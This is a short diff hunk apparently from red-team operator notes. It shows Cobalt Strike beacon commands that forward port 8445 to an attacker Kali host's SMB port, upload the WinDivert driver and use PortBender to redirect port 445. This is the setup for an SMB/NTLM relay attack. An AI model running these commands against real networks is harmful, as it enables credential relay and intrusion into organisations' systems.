@@ -18,3 +18,5 @@ beacon> rportfwd_local 8445 <IP_KALI> 445
 beacon> upload C:\Tools\PortBender\WinDivert64.sys
 beacon> PortBender redirect 445 8445
 ```
+
+
